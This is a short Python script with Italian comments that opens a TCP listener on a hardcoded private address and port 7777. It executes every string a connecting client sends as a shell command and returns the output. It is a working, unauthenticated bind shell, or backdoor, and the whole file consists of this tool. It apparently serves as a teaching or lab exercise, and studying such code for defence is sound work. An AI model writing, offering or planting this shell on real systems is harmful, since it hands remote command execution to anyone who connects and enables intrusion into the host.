import socket  # Importa il modulo "socket" per la comunicazione di rete
import subprocess  # Importa il modulo "subprocess" per eseguire comandi di sistema
from ctypes.wintypes import INT  # Importa il tipo di dato INT dal modulo "ctypes.wintypes"

HOST = '192.168.90.101' 
PORT = 7777

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crea un socket TCP/IP

server_socket.bind((HOST, PORT))  # Associa il socket all'indirizzo e alla porta

server_socket.listen(1)  # Inizia l'ascolto delle connessioni in entrata

client_socket, client_address = server_socket.accept()  # Accetta la connessione dal client

while True:  # Ciclo infinito per l'invio e la ricezione dei comandi
    command = client_socket.recv(4096)  # Ricevi il comando dal client
    command = command.decode()  # Decodifica il comando da byte a stringa
    
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)  # Esegui il comando utilizzando il modulo subprocess
    output = op.stdout.read()  # Leggi l'output del comando
    output_error = op.stderr.read()  # Leggi gli eventuali errori dell'esecuzione del comando
   
    client_socket.send(output + output_error)   # Invia l'output e gli errori al client

# Chiudi le socket alla fine dell'esecuzione
client_socket.close()
server_socket.close()
